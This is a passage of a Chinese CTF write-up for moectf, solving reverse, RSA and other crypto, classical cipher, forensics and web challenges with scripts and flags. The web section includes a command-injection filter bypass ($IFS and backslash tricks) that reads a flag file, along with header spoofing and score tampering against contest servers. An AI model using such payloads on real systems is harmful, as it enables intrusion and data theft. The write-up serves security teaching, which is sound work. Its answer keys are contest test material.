    for(int i=1;i<=50;i++)
        for(int j=1;j<=i;j++)
            mapp[i][j] = rand()%1919810;
}
void fail(string info){
    cout<<info;
    exit(-1);
}
int main(){
    init();
    mkdata();
    string a;
    cin>>a;
    if(a.size()!=49)
        fail("Input ERROR");
    else{
        int x, y;
        long long score=mapp[1][1];
        x=y=1;
        for(int i=0;i<a.size();i++){
            x += 1;
            if(a[i]!='L' && a[i]!='R' && a[i]!='D')
                fail("Input ERROR");
            else{
                switch (a[i]){
                    case 'L':
                        y-=1;
                        break;
                    case 'R':
                        y += 1;
                        break;
                    default:
                        break;
                }
                if (y<=0)
                    fail("Edge ERROR");
            }
            score += mapp[x][y];
        }
        cout<<"This's your score: "<<score;
        cout<<"\nThe input is the content of flag. Do remember add the moectf{}.";
    }
}
```

预期解的话是用我的种子，自己生成这个地图（数塔）， 然后线性动态规划，做一下就好啦~

exp：

```c++
#include<bits/stdc++.h>
using namespace std;
int dp[60][60];
char pre[60][60];
int n=50;
void mkdata()
{
    memset(dp, 0, sizeof(dp));
    int seed = 114514;
    srand(seed);
    for (int i = 1; i <= 50; i++)
        for (int j = 1; j <= i; j++)
            dp[i][j] = rand() % 1919810;
}
int main()
{
    mkdata();
    for(int i=2;i<=n;i++)
    {
        for(int j=1;j<=i;j++)
        {
            int way1=0,way2=dp[i-1][j],way3=0,maxx=1;
            if(j-1>=1)
                way1 = dp[i-1][j-1];
            if(j+1<=i)
                way3 = dp[i-1][j+1];
            if(way2 > way1)
            {
                way1 = way2;
                maxx=2;
            }
            if(way3 > way1)
            {
                way1 = way3;
                maxx = 3;
            }
            if(maxx == 1) pre[i][j] = j-1;
            if(maxx == 2) pre[i][j] = j;
            if(maxx == 3) pre[i][j] = j+1;
            dp[i][j] += way1;
        }
    }

    for(int i=1;i<=n;i++){
        for(int j=1;j<=i;j++)
            cout<<dp[i][j]<<" ";
        cout<<"\n";
    }

    int aim=dp[n][1],aim_arg=1;
    string ans;
    for(int i=2;i<=n;i++)
       if(aim < dp[n][i]){
       		aim_arg = i;
       		aim = dp[n][i];
	   }
           
    cout<<"\n\n"<<dp[n][aim_arg]<<"\n";
    for(int i=n;i>=2;i--)
    {
        int now = pre[i][aim_arg];
        if(now == aim_arg-1)    ans += 'R';
        if(now == aim_arg)  ans +='D';
        if(now == aim_arg+1) ans +='L';
        aim_arg = now;
    }
    for(int i=(int)ans.size()-1;i>=0;i--)
        cout<<ans[i];
}

```



## Crypto

### Cryptography指北

- 好好看看内容，然后拿flag
- `flag:  `moectf{cRyp7oGr@phy_1s_c00l!}

### beginOfCrypto

- 基本上只需要去看懂题目，发现就是对每个 e 进行对 他的Ascii码值次进行计算

- ##### 预期解：

  直接求对数 然后转换成ascii字符

  ###### exp:

  ```python
  import math
  c = 
  
  for i in c:
      print(chr(int(math.log(i,math.e))),end='')
  ```

- ###### 非预期解：

  可以爆破每个可见字符的值，然后一一对应去拿到flag

- `flag:` moectf{c0me_on!begin_your_Crypt0_c4r33r}

### BabyMultiple

- 题目使用了63个字符，使用的是
  $$
  msg_i*Mul\mod n = cip_i
  $$
  一位一位对应拿到密文，本来是放在另外一场比赛的签到题（

- ###### 预期解：

  对应求乘法逆元 找到原来的值，就可以求出来flag

  ###### exp:

  ```python
  from Crypto.Util.number import*
  table = b'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
  c = b'g3AfJPOfHPOJFfJuf_AYux1JFx39'
  Mul = 58
  
  def decode(c,mul):
      m = b'moectf{'
      MMul = inverse(mul,63)
      for i in c:
          index = table.find(i)
          index_after = (index * MMul) % 63
          m = m + bytes.fromhex(hex(table[index_after])[2:])
      return m + b'}'
  
  print(decode(c,Mul))
  ```

  

- `flag:` moectf{y0u_4r3_gr34t_47_Mu17ic4ti0n}

### LazyRSA

- 生成512位的素数p,q然后使用RSA进行对明文加密，并且p,q,e都已知

- ###### 预期解：

  $$
  \phi = (p-1)(q-1)\\
  d = e^{-1}\mod \phi\\
  m = c^d\mod n = m^{de}\mod n = m \mod n
  $$

  ###### exp:

  ```python
  from Crypto.Util.number import*
  p =  
  q =  
  c =  
  
  n = p * q
  phi = (p-1) * (q-1)
  e = 0x10001
  d = inverse(e,phi)
  print(long_to_bytes(pow(c,d,n)))
  ```

- `flag:` moectf{w0w_yOU_Know_h0w_70_d3crypt_th3_RSA} 

### PRintNewG

- 观察题目，发现实现了一个 **PRintNewG** 的类，并且用 **flag** 去初始化
  $$
  state_{i+1} = state_i\times a + b\mod n 
  $$
  并且给了我们3个连续的state

- ###### 预期解：

  我们可以直接解方程进行求解拿到flag
  $$
  state_{i+2}-state_{i+1}=a\times(state_{i+1}-state_{i})\mod n
  $$
  这里就能通过乘法逆元拿到a，接着带进任意一条就能拿到b最后我们就可以计算flag了

  ###### exp:

  ```python
  from Crypto.Util.number import *
  n = 164955381960104851576442781839629371483790790743830073857213053104860144345367
  s1 = 67066424717605861916529090048670931008913194546199003522357504998012803616537
  s2 = 14585402872351563180055857554749250191721167730349724393021149201170995608751
  s3 = 68393939370424772490169906192546208899639826391163845848999554903218827210979
  #s2  = a*s1+b %n , s1 = a*flag+b  s3 = a*s2 +b %n
  
  a = ( inverse(s2-s1,n) * (s3-s2) ) % n
  b = (s2 - a * s1) % n
  flag = (s1 - b ) * inverse(a,n) % n
  print(long_to_bytes(flag))
  ```

- `flag:` moectf{PR1nt_N3w_G_s0_e45y}

### NumberTheory-FeeeeeMa

- 发现题目中用于生成RSA的n的2个素数很接近

- ###### 预期解：

  设 p = a+b , q = a-b，则 n = a^2^ - b ^2^  

  我们把a从根号n+1开始爆破只要实现 a^2^ - n 是平方数就分解成功

  ###### exp:

  ```python
  c = 
  n = 
  e = 0x10001
  '''
  p = (a+b)/2    q = (a-b)/2   pq = n =a*a-b*b /4     a*a = 4*n+b*b
  '''
  from Crypto.Util.number import*
  import gmpy2
  
  a = gmpy2.iroot(4*n,2)[0] + 1
  while 1:
      if gmpy2.iroot(a*a - 4 * n,2)[1]:
          break
      a = a + 1
  b = gmpy2.iroot(a*a - 4 * n,2)[0]
  p = (a+b)//2
  q = (a-b)//2
  
  phi = (p-1) * (q-1)
  d = gmpy2.invert(e,phi)
  
  print(long_to_bytes(pow(c,d,n)))
  ```

- `flag:` moectf{y0u_c4n_e4s1ly_f4ctor_th3_N}

### BBBBBBBackpack

- 观察题目，发现实现的是一个超递增序列，并且给出了这条序列，以及，给出了我们一条只有0-3的序列的对应的数

- ###### 预期解：

  代入直接进行乘起来相加

  ###### exp:

  ```python
  from Crypto.Util.number import*
  backpack = 
  l_list = 
  
  l_list = l_list[::-1]
  m = 0
  for i in range(160):
      m = m + l_list[i] * backpack[i]
  
  print(long_to_bytes(m))
  ```

- `flag:`  moectf{BBBBBB4ckp4ck_i5_br0k3n}

### FesitelTripple

- 看题目，我们发现他这里实现了一个3次Fesitel结构的加密解密，但是每次加密的时候又有3轮左右换位的样子，并且使用了AES，并且key1 key2都已经给出

- ###### 预期解：

  这里我用了一个小trick,可能会有人觉得直接用encrypt和decrypt函数能直接逆回去，所以我稍微改了下decrypt函数，就对应逆回去就好了

  ###### exp:

  ```python
  from Crypto.Util.number import*
  from Crypto.Cipher import AES
  
  def encrypt(plaintext,keystream):
      assert len(plaintext) == 32
      assert len(keystream) == 48
  
      left = plaintext[:16]
      right = plaintext[16:]
  
      for i in range(3):
          aes = AES.new(keystream[(2-i)*16:(2-i)*16+16],AES.MODE_ECB)
          new_right = long_to_bytes(bytes_to_long(aes.encrypt(right)) ^ bytes_to_long(left))
          new_left = right
          left = new_left
          right = new_right
      return left + right
  
  def decrypt(ciphertext,keystream):
      assert len(ciphertext) == 32
      assert len(keystream) == 48
  
      left = ciphertext[:16]
      right = ciphertext[16:]
  
      for i in range(3):
          aes = AES.new(keystream[(2-i)*16:(2-i)*16+16],AES.MODE_ECB)
          old_right = left
          old_left = long_to_bytes(bytes_to_long(right) ^ bytes_to_long(aes.encrypt(old_right)))
          left = old_left
          right = old_right
      
      return left + right
  
  key1 = b'it_is_just_the_first_time_key_and_encrypt_twice~'
  key2 = b'y0u can d0 what y0u w4nt t0 do!Go0d wishes~do it'
  
  cipher = b'\x12\xb7Ka\x1b\x14\xe9\xaf\xac\x96\x14\xb09\x8a$\xf8^\x91\xb6\x15m\xb8\x91\xad0\x93\x90\xeb\x16aw\x87'
  
  plain = decrypt(cipher,key1)
  plain = encrypt(plain,key2)
  plain = decrypt(plain,key1)
  
  print(plain)
  ```

- `flag:` moectf{th3_f3sit3l_1s_symmetric}

### NumberTheory-Powwwwwer

- 观察题目，给出了2个加密指数，并且对同一个消息和使用相同的n进行RSA加密

- ###### 预期解：

  就直接共模攻击，使用扩展欧几里得找到对应a,b
  $$
  m^{e1}\mod n =c1,m^{e2}\mod n = c2\\
  ae1+be2=1\\
  m = m^{ae1+be2}\mod n=c1^ac2^b\mod n
  $$

  ###### exp:

  ```python
  import gmpy2
  from Crypto.Util.number import *
  
  c1 = 
  c2 = 
  n = 
  
  e1 = 0x114514
  e2 = 11451401
  
  g,x,y = gmpy2.gcdext(e1,e2)
  print(long_to_bytes((pow(c1,x,n) * pow(c2,y,n))%n))
  ```

- `flag:` moectf{s0_Powwwwwwwwwwwww3r!}

### NumberTheory-MyGrandson

- 观察题目，发现他实现了的是一个 对相同的消息使用小指数 以及 n_list去加密

- ###### 预期解：

  使用中国剩余定理，具体可以百度，

  ###### exp:

  ```python
  from Crypto.Util.number import*
  import gmpy2
  
  n_list = 
  c_list = 
  e = 0x3
  N = 1 
  for i in n_list:
      N *= i
  
  Ni = []
  ti = []
  for i in range(len(n_list)):
      Ni.append(N//n_list[i])
      ti.append(gmpy2.invert(Ni[i],n_list[i]))
  
  sum = 0
  for i in range(len(n_list)):
      sum += c_list[i] * ti[i] * Ni[i]
  
  print(long_to_bytes(gmpy2.iroot(sum % N,e)[0]))
  ```

- `flag:` moectf{Chinese_Remain_Theory}

### 马锤壳s

- 实现了对消息转成01矩阵，接着T一次，并且生成了一个17×17的大素数矩阵，然后矩阵乘法
  $$
  c = m\times K
  $$
  给出的条件是加密后的K
  $$
  K = A\times K +B \mod 2^{512}
  $$

- ###### 预期解：

  先直接计算K，接着可以拿K去解密C

  ###### exp:

  ```python
  from sage.all import *
  from Crypto.Util.number import*
  
  Key = 
  K = Matrix(Zmod(2**512),Key)
  K = ((K-12138)/0x10001)
  
  NEW_K = Matrix(ZZ,K)
  
  C = 
  C = Matrix(ZZ,C)
  m = NEW_K.solve_left(C)
  M = ''.join(str(i) for i in ((m.T).list()))
  print(long_to_bytes(int(M,2)))
  ```

- `flag:`moectf{L1ne4r_Alg3br4_w1ll-b3,c0o1~}

### ezRSA

- 题目给出了一个n = pqr , 还有一个s，同时还有个
  $$
  gift=p^{(q-1)(r-1)qr}(qr+1)^q\mod (qr)^3
  $$
  还给了个
  $$
  k=(p-s)d
  $$

- ###### 预期解：

  我们发现这个S是单调递增的于是我们可以使用二分求解拿到S。

  同时可以发现我们可以通过计算
  $$
  3^{ek}\mod n - 3^{1-s}\mod n =3^{p-s}\mod n -3^{1-s}\mod n 
  $$
  如果同时模p发现他=0，因此他其实是p的倍数，我们只需要去用这个和n求最大公因子，就能拿到p

  接下去 使用Gift 发现，在gift里面利用多项式定理，并且我们去改变一下模数，为 q^2^r^2^ 就能使得式子变成
  $$
  gift = p^{q(q-1)r(r-1)}(qr+1)^q = (qr+1)^q=(q^2r+1) \mod (qr)^2
  $$
  所以就能拿到q^2^r，接着就能够拿到这个q，所以r也能拿到了 ，成功分解

  ```python
  from Crypto.Util.number import*
  def getS(data):
      left,right = 0,2**301
      for i in range(1000):
          tmp = (left + right)//2
          if 160 * tmp ** 5 - 4999 * tmp ** 4 + 3 * tmp ** 3 +1-data > 0:
              right = tmp
          else:
              left = tmp
      return tmp
  s = 
  s = getS(s) 
  e = 0x10001
  n = 
  k = 
  c = 
  a = pow(3,e*k,n)-pow(3,1-s,n)
  p = GCD(a,n)
  N = n//p
  gift = 
  ppq = gift%(N**2) - 1
  r = ppq//N
  q = N//r
  print(q*p*r==n)
  phi = (p-1)*(q-1)*(r-1)
  d = inverse(e,phi)
  print(long_to_bytes(pow(c,d,n)))
  ```

- `flag:` moectf{5om3_M4th_m4y,b3_c0oool!}

### BigOreo

- 看题目，给出了一个TCP交互环境，并且给出四个选项 第一个 加密，第二个解密 第三个拿到加密的flag，第四个是退出。

  handle部分，先是要求一个工作量证明，接着要初始化key,iv,nonce给出了iv,nonce.

  注册一个Username，成功后有三次机会交互机会，

  1. 第一个选项，直接使用你的username,系统的iv,key,nonce进行一次加密

  2. 第二个选项，你要给出你的密文，和IV，然后去解密拿到明文
  3. 第三个选项，给出密文和IV，并且用 `||` 去分隔每块内容，如果你改了你的username或者是Nonce，以及消息不是MSG就失败了，否则就给出flag

- ###### 预期解：

  看CBC的加密模式

  ![img](https://ctf-wiki.org/crypto/blockcipher/mode/figure/cbc_encryption.png)

  ![img](https://ctf-wiki.org/crypto/blockcipher/mode/figure/cbc_decryption.png)

  这道题解密过程中需要满足，改变密文或者使得 中间的消息`GiveyourFLAG`为`Give_me_FLAG`，但如果直接改变上段密文的内容的话，会导致第一段明文解密完全乱掉，但是我们可以通过给他一个不一样的IV去异或就能使得明文是原来的NOnce

  ###### exp:

  ```python
  from pwn import *
  from Crypto.Util.number import *
  from Crypto.Cipher import AES
  from hashlib import sha256
  import string
  from pwnlib.util.iters import mbruteforce
  
  
  table = string.ascii_letters+string.digits
  def proof_of_work():
      io.recvuntil(b'XXX+')
      suffix = io.recv(9).decode("utf8")
      io.recvuntil(b'== ')
      cipher = io.recvline().strip().decode("utf8")
      proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==
                          cipher, table, length=3, method='fixed')
      io.sendlineafter(b'XXX :', str(proof).encode())
  io = remote("81.68.112.139",10005)
  username = b'admin_Avalon_Moe'
  proof_of_work()
  io.recvuntil(b'[+]iv:')
  iv = io.recv(16)
  io.recvuntil(b'[+]nonce:')
  nonce = io.recv(16)
  
  io.recv()
  io.sendline(b'1')
  io.recv()
  io.sendline(username)
  
  io.recv()
  io.sendline(b'1')
  io.recvuntil(b'[+]cipher:')
  cipher = io.recv(48)
  cipher = cipher[:6] + long_to_bytes(bytes_to_long(b'your')^bytes_to_long(b'_me_')^bytes_to_long(cipher[6:10]))+cipher[10:]
  
  io.recv()
  io.sendline(b'2')
  io.recv()
  io.sendline(cipher)
  io.recv()
  io.sendline(iv)
  io.recvuntil(b'Plain is :')
  non = io.recv(16)
  
  new_iv = long_to_bytes(bytes_to_long(iv) ^ bytes_to_long(nonce)^ bytes_to_long(non))
  io.recv()
  io.sendline(b'3')
  io.recv()
  io.sendline(cipher)
  io.recv()
  io.sendline(new_iv)
  io.interactive()
  ```

- `flag:` moectf{Oreo_Ju5t_5o_5o}





## Classical Cryptography

### Augustine's Way

- `npfdug{f3tz_Bv9v5u1of!}` 

- 简单的Casear密码
- `flag:`moectf{e3sy_Au9u5t1ne!}

### OldButPopular

- `qj3r_y31s{vxk7_hig__0_a}g4ax_x0x540slv`
- 观察密文，发现他的括号不对劲，试试看栅栏密码 5个字数1组，发现他还是不太对，然后去凯撒一下4位
- `flag:` moectf{c453r_w4nt_t0_g0_ou7_th3_w0r1d}

### Augustine's Way#2

- `eg][l^sdm(i)YfWqq\-u`
- 发现是每位都移动了，那就爆破
- `flag:` moectf{lu0q1an_yyd5}

### Ez Vigenere

- `dlcawx{kec_ihq_fc_tgjwebpc_lk_iuwwgk}`
- 猜测一下，使用moectf去当密钥，发现拿到的前6位是rxyyds,接着使用他去当作密钥，接着去解密
- `flag:` moectf{the_key_of_vigenere_is_rxyyds}

### モンスターを縫う！

- 六段解密
- 第一段 Casear；第二段 维吉尼亚；第三段 栅栏密码；第四段培根；第五段 RoT13；第六段 摩丝密码
- `flag:` moectf{cl@ssical_cipheripr3tty_g00d!}

### Ex Viginere?

- 发现使用了一个task.py进行加密。将明文段 使用一个长为a的k1 和 b的k2 进行加密
  $$
  c = m k_1 +k_2 
  $$
  其实就是跟vigenere的做差不多。

  Flag在明文里面，并且是这个key 给出了key加上一段Padding的md5

- ###### 预期解：

  先是使用词频分析 拿到keylen  = 77 = 7 × 11

  所以a=7 , b=11

  然后去爆破他的k1 k2具体是多少，然后分析一下拿到k1,k2

  ```python
  import gmpy2
  f = open(r'./cipher','r')
  c = f.read()
  f.close()
  # 我们已经知道，维吉尼亚密码可以被分解为若干组平移密码来破译，
  # 而一个明文足够长的平移密码的重合指数接近0.0687。
  # 换言之，如果我们选取某个l值，使得分组后的密文的重合指数接近0.065，
  # 则说明选取的t值与密钥的长度是一致的。
  best_index = 0.065
  sum = 0
  dic_index = {'a': 0.08167,'b': 0.01492,'c': 0.02782,'d':0.04253,'e': 0.12702,'f':0.02228,'g': 0.02015,'h':0.06094,'i':0.06966,'j':0.00153,'k':0.00772,'l':0.04025,'m':0.02406,'n':0.06749,'o':0.07507,'p':0.01929,'q':0.00095,'r':0.05987,'s':0.06327,'t':0.09056,'u':0.02758,'v':0.00978,'w':0.02360,'x':0.00150,'y':0.01974,'z':0.00074}
  
  def IndCo(s):
      # 计算字符串的重合指数（所有字母出现频率的平方和）
      # 输入 s 
      # 输出 重合指数
      alpha = 'abcdefghijklmnopqrstuvwxyz'
      freq = {}
      for i in alpha:
          freq[i] = 0
      for i in s:
          freq[i] =  freq[i] + 1
      index = 0
      for i in alpha:
          index = index + (freq[i]*(freq[i] - 1 )) / (len(s) * (len(s) - 1 ))
      return index
  
  def IndCo_m(s):
      # 计算明文s中的各字母频率和英文字母中的频率吻合程度
      # 输入：明文s
      # 输出：吻合程度
      alpha = 'abcdefghijklmnopqrstuvwxyz'
      freq = {}
      for i in alpha:
          freq[i] = 0
      for i in s:
          freq[i] += 1
      index = 0
      for i in alpha:
          index += freq[i] / len(s) * dic_index[i]
      return index
  
  def get_keylen(c):
      # 求出最符合统计学的m,n的最小公倍数，方法通过爆破足够大的周期样本，观察成倍出现的周期
      # 计算方法是解出每一个子密文段的重合指数然后求平均值 在和最佳重合指数相减 误差小于0.01
      # 输入：密文
      # 输出：公共周期列表
      keylen = []
      for i in range(1,100):
          average_index = 0
          for j in range(i):
              s = ''.join(c[j+i*x] for x in range(0,len(c)//i))
              index = IndCo(s)
              average_index += index
          average_index = average_index / i - best_index
          if abs(average_index) < 0.01:
              keylen.append(i)
      return keylen
  
  keylen = get_keylen(c)
  print(keylen)
  
  #____________________________得到keylen_____________________________#
  #____________________________爆破flag———————————————————————————————#
  
  def decrypt(c,i,j):
      alpha = 'abcdefghijklmnopqrstuvwxyz'
      m = ''
      for x in c:
          m += alpha[((alpha.index(x)-j)*gmpy2.invert(i,26))%26]
      return m 
  
  def get_key(c):
      # 得到一个密文段的单个字符key .i .j
      # 暴力枚举，找到最符合的
      # 输入：密文段
      # 输出：i,j
      for i in range(26):
          if gmpy2.gcd(i,26)!= 1 :
              continue
          for j in range(26):
              m = decrypt(c,i,j)
              index = IndCo_m(m)
              if abs(index-0.065)<0.01:
                  return (i,j)
  
  def get_all_key(s,keylen):
      # 得到一个周期内所有密文段的key
      # 输入：原密文，周期
      # 输出：无
      for i in range(keylen):
          temps = ''.join([s[i+x*keylen] for x in range(0,len(s)//keylen)])
          print(get_key(temps))
          if get_key(temps) == None:
              break
  
  for i in range(len(keylen)):
      get_all_key(c,keylen[i])
  ```

  接着没有给出flag的长度，直接爆破长度..

  ```python
  from hashlib import*
  
  plaintext = ''
  k1 = [9,7,25,11,11,19,5,3,25,9,7]
  k2 = [25,19,18,19,25,20,8]
  l1 = len(k1)
  l2 = len(k2)
  alpha='abcdefghijklmnopqrstuvwxyz'
  for i in range(len(c)):
      plaintext+=alpha[((alpha.index(c[i])-k2[i%l2])*gmpy2.invert(k1[i%l1],26))%26]
  
  Pad = b'How_Interesting_the_Cryptography_Is'
  MD = '196cf7098c7ea6e3e4d03691fb9d4f58'
  for j in range(20):
      for i in range(len(plaintext)-j):
          key = plaintext[i:i+j]
          if md5(key.encode()+Pad).hexdigest() == MD:
              print(key)
              print('moectf{'+key+'}')
              break
  ```

- `flag:` moectf{pieceofchocolate}

## MISC

### 01 - find_me 50

#### Discription

树师傅在自己最喜欢的照片里藏了 flag，你能找出来吗？顺便一提，树师傅最喜欢的16进制编辑器是 `010 Editor`。

#### Solve

16进制编辑器查看，flag 在末尾。

![image-20210922112207681](https://i.loli.net/2021/09/22/j3d4HB1sGbazq5v.png)



### 02 - Macross 50

#### description

含树：`Macross` 是什么？
Noah：超时空要塞
含树：？？？
Noah：谷歌必应百度，请

#### Solve

谷歌\必应\百度搜索 `mrf file` 可以知道 `mrf` 扩展名可能是 `Mouse Recorder File`。
下载一个可以打开 `mrf` 的软件，播放宏 (Macro) 即可拿到 flag。



### 03 - Homework 100

#### Description

Noah 看到含树将自己珍藏了多年的 flag 送给了学弟，于是随手翻了翻自己以前的作业，也丢了出来。

#### Hint

写作业字数凑不够怎么办啊啊啊啊啊啊啊啊啊啊TAT

#### Solve

字体全部改成黑色，调节字宽至100%，得到 flag 的前半部分。
将视图切换到阅读版式或 web 视图，看到页面外的文本框中的 flag 的后半部分。

![image-20210922112434969](https://i.loli.net/2021/09/22/KnyDRwxQurWHoBf.png)



### 04 - flipflipflip 100

#### Description

转↑转↓转↑转↓转↑转↓转↑转↓转↑转↓转↑转↓

#### Solve

查看文件末尾，发现等号，尝试 base64 解码。

![image-20210922113653743](https://i.loli.net/2021/09/22/5bH3VzpAjUN6RwQ.png)

解码之后发现等号出现在了文件头部。

![image-20210922113736398](https://i.loli.net/2021/09/22/diuBoQa6cOm5yIs.png)

字符串倒序，多进行几次解码后会发现正序、倒序是无规律出现的。

![image-20210922113910052](https://i.loli.net/2021/09/22/YRSzIxBodQkG5Oj.png)

写一个 python 脚本：

```python
from base64 import b64decode as bd

fin = open("task", "rb")
data = fin.read()
fin.close()

while True:
    try:
        data_ = bd(data)
        data_.decode("utf-8")
    except Exception:
        data_ = bd(data[::-1])
    if "{" in data_.decode():
        print(data_.decode())
        break
    data = data_
```



### 05 - White Album 100

#### Description

真的只是一张图片。

#### Solve

用16进制编辑器修改图片的高度：

![image-20210922120238311](https://i.loli.net/2021/09/22/G4rnxKHcpMNaJgb.png)

关于 `png` 的文件头，可以参考 `CTF Wiki`：[PNG - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/misc/picture/png/#:~:text=对于一个 PNG 文件来说，其文件头总是由位固定的字节来描述的，剩余的部分由 3 个以上的 PNG 的数据块（Chunk）按照特定的顺序组成。 文件头,1A 0A %2B 数据块 %2B 数据块 %2B 数据块……)

可以发现图片的底部放了一个 PDF417 码。

![image-20210922120713422](https://i.loli.net/2021/09/22/Qapbn93NOTFAyJL.png)

不认识这是什么的话，搜索一下也可以知道。找一个在线扫码网站扫码，部分手机自带的扫码功能也可以扫 PDF417。

![image-20210922120701829](C:\Users\Noah\AppData\Roaming\Typora\typora-user-images\image-20210922120701829.png)

![image-20210922121124227](https://i.loli.net/2021/09/22/qDcNGTf3EnV1Rz4.png)



### 06 - 社工题 150

#### Description

含树偷偷告诉你： **他在 Noah 的博客里留下了一些 flag** 
本题目不需要加 QQ 或者打电话。 flag 隐藏在某个网页上，不在文件里。

#### Hint

据说Noah有3个博客。

#### Solve

必应或者谷歌搜索，可以找到第一个博客。

![image-20210922124359306](https://i.loli.net/2021/09/22/1h2EetkYFqGQXrs.png)

在这个博客的 `关于` 中可以找到第二个博客的地址。

![image-20210922124533221](https://i.loli.net/2021/09/22/wy9VSuHIvl64hbi.png) 

在第二个博客的简介中可以看到博客迁移的信息

![image-20210922124631915](https://i.loli.net/2021/09/22/3M4JBvVkf5eLAKE.png)

在第三个博客的 `留言簿` 中可以看到带黑阔HS的留言

![image-20210922124825957](https://i.loli.net/2021/09/22/wkNl1IRiW4hoVtJ.png)

从博客的侧边栏进入 github 页面，可以看到一个叫 `HackedbyHS` 的仓库，只有三个 `branch`。`NoahBox-patch-1` 中有一串莫尔斯电码。找一个在线解码网站解码，得到 flag。（有些在线工具无法解出符号）

![image-20210922125156505](https://i.loli.net/2021/09/22/XASF5ZtdNmQ1JVH.png)



### 07 - 好 康 的 150

#### Description

一个好康的视频，请在没有家长陪同的情况下偷偷观看。 附件：https://masternoah.lanzoui.com/iFXVfsy5o3e

#### Solve

浏览视频会发现进度条有些不对劲，视频已经结束了进度条只到了大约 2/3 的位置。
用 `MKVExtract` 提取 `mkv` 文件中封装的字幕，在字幕中得到 flag。

![image-20210922131625077](https://i.loli.net/2021/09/22/ajzE7PJkmfYHSpc.png)



### 08 - easyForensics 200

#### Description

link：https://cloud.189.cn/t/EJNBzmzmeiMb (访问码:h3pj) 
Noah捡到了一个移动硬盘，里面似乎有点小东西。

#### Hint

E01扩展名是什么捏？ 
https://www.forensicsware.com/blog/e01-file-format.html

#### Solve

使用 `X-ways Forensics` 或 `FTK` 加载 E01 镜像。
在 `\Documents` 目录下可以看到被删除的 `file` 文件夹和 `1.py`。

![image-20210922132224351](https://i.loli.net/2021/09/22/sYGx2uXJM5abPDk.png)

```python
# 1.py
from base64 import b64encode as be
import os
import re

with open("file.in", "rb") as fin:
    data = fin.read()

data = be(data).decode()
data = data.replace("/", "_")
data = re.findall(r'.{40}', data)

base = os.getcwd() + "\\file\\"
count = 1
for item in data:
    folder = str(count) + " " + item
    if count < 10:
        path = base + "00" + folder
    elif count <100:
        path = base + "0" + folder
    else:
        path = base + folder
    os.mkdir(path)
    count += 1
```

脚本的作用是将 `file.in` 先 `base64` 编码，再将 `/` 替换为 `_`。将得到的base64串截成长度为40的切片，在 `file` 目录下创建以`编号+切片`为名的文件夹。

写一个 python 脚本将这个过程反过来。

```python
from base64 import b64decode as bd
import os

data = ""

for root,dirs,files in os.walk("./file/"):
    for dir in dirs:
        data += dir.split()[1]

data = file.replace("_", "/")

with open("file.out", "wb") as fout:
    fout.write(bd(data))
```

查看输出文件，是一个 `docx` 文件。

![image-20210922171140414](https://i.loli.net/2021/09/22/eB72WRjIPmMrKba.png)

打开 `docx` 文件之后得到 flag。



### 09 - R P G 200

#### description

link：https://cloud.189.cn/t/IjUN3qEvM3Mv (访问码:s8n1)
某天，Noah 在逛 steam 的时候发现了一个有意思的软件。当天下午，他把匆忙做出来的游戏发给了 HS。

#### Solve

和 Cat(迫真) 对话之后可以知道 flag 在无法抵达的河对面。

在 data 文件夹中可以看到 `Map001.json` 和 `Map002.json`,打开之后可以发现 `Map001.json` 中存储着之前看到的对话内容，所以 `Map002.json` 中存储的应该是另外一张地图的数据。

在 `Map002.json` 中可以看到 events 中有许多相似的行：

![image-20210922175954329](https://i.loli.net/2021/09/22/v4lfSgtNYy53asK.png)

对比几条数据之后可以发现，这些记录只有 `id` & `name` & `pages[0] -> list[1] -> parameters ` & `x` & `y` 的值有所不同。而且 `parameters` 的数据连起来像是 `base64`。

写一个 `python` 脚本提取 `parameters` 中的值：

```python
from base64 import b64decode
import json

fin = open("Map002.json", "r")
map = json.load(fin)

s = b""
for i in map["events"]:
    if i:
        s += i["pages"][0]["list"][1]["parameters"][0].encode()

while 'moectf' not in s.decode():
    s = b64decode(s)

print(s.decode())
```



### 10 - 诺亚的日记 300

#### Description

> 听说Noah准备要写日记了，于是bb在Noah的电脑上做了点手脚。

#### Hint

[Document Library | USB-IF](https://www.usb.org/documents)

#### Solve

打开后可以看到全是 USB 流量。

在命令行中：`tshark.exe -r .\capture.pcapng -T fields -e usbhid.data > data.txt`，将流量包中的 `hid data` 导出。

根据 `USB HID` 文档中的对照表，写一个简单的脚本：

```python
fin = open("data.txt", "r")
data = fin.readlines()

s = ""
table = "abcdefghijklmnopqrstuvwxyz1234567890-="
for i in data:
    if i and i[:4] == "0000":
        h = int(i[4:6], 16)
        if 0x03 < h < 0x27:
            s += table[h - 4]
        elif h == 0x28:
            s += "<ENT>"
        elif h == 0x29:
            s += "<SPA>"
        elif h == 0x30:
            s += "<DEL>"
        else:
            pass
print(s)
```

### 11 - Phone Call

https://github.com/Reverier-Xu/DTMF-Challenges

## Web

### Web安全入门指北—GET

`https://47.93.215.154:10000?moe=flag`

### Web安全入门指北—POST

1）火狐或者谷歌都可以安装hackbar，利用hackbar可以直接发送POST请求

2）postman

3）burpsuite

4）......

### Web安全入门指北—小饼干

浏览器F12

![image-20210921013111399](https://i.loli.net/2021/09/22/VqxJU8KAfvc1yob.png)

### 2048

游戏结束时，有一个上传分数的过程

![image-20210921135704859](C:\Users\Cys\AppData\Roaming\Typora\typora-user-images\image-20210921135704859.png)

改包就行了

![image-20210921135736513](https://i.loli.net/2021/09/22/5w9pXInjJO2oVAF.png)

### babeRCE

一个比较基础的命令执行绕过trick，空格被过滤可用	`$IFS`，可通过`\`来绕过对关键词的过滤

![image-20210921140203388](https://i.loli.net/2021/09/22/HAx9U8pDjVuGyc5.png)

`http://47.93.215.154:5000/?rce=ca\t$IFS./f\lag.php`

![image-20210921140310843](https://i.loli.net/2021/09/22/DAno7mCw5dPRBia.png)

### Do you know HTTP？

这是一道想让大家学习http请求头相关知识以及请求报文格式相关知识的题目

每一次请求都会有提示信息出现在返回里面

首先提示用'HS'请求试试，故修改请求方式

![image-20210921140729729](https://i.loli.net/2021/09/22/MKklus7rPFbHt69.png)

![image-20210921140837882](https://i.loli.net/2021/09/22/dHeXj9yfawmGARr.png)

然后是要用本地IP，加XFF头或者Client-IP均可

![image-20210921141202464](https://i.loli.net/2021/09/22/tAlpMvFujfP1VJb.png)

要从`www.ltyyds.com`过来，即需要添加Referer头

![image-20210921141231492](https://i.loli.net/2021/09/22/vY7MUOEFKr8BsDZ.png)

最后是修改UA头

